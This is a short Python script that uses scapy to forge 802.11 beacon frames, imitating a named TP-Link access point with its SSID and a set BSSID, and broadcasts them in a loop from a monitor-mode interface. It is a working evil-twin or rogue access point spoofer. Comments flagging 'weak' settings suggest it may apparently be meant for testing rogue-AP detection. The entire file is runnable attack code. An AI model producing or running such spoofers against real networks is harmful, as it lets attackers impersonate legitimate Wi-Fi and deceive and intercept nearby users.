from scapy.all import *
import random
import time

iface = "wlan0mon"  # Make sure it's in monitor mode
fake_bssid = "40:AE:30:2B:E8:0E"  #  BSSID
ssid = "TP-Link_E80E"  # Same SSID as target

def create_beacon():
    # Random MAC for source address to simulate fake AP
    src_mac = fake_bssid

    # Beacon frame layers
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=src_mac)
    beacon = Dot11Beacon(cap="ESS")  #Weak: capabilities are minimal
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    rates = Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96')  #Weak: old rates only
    dsset = Dot11Elt(ID="DSset", info=chr(3).encode())  # Channel 3
    interval = 200  # Weak: different from real AP's 100

    frame = RadioTap() / dot11 / beacon / essid / rates / dsset
    frame[Dot11Beacon].beacon_interval = interval
    return frame

def send_fake_beacons():
    print(f"[+] Broadcasting fake beacons for SSID: {ssid}")
    while True:
        pkt = create_beacon()
        sendp(pkt, iface=iface, inter=0.1, loop=0, verbose=0)
        time.sleep(0.1)

if __name__ == "__main__":
    try:
        send_fake_beacons()
    except KeyboardInterrupt:
        print("\n[!] Stopped broadcasting.")
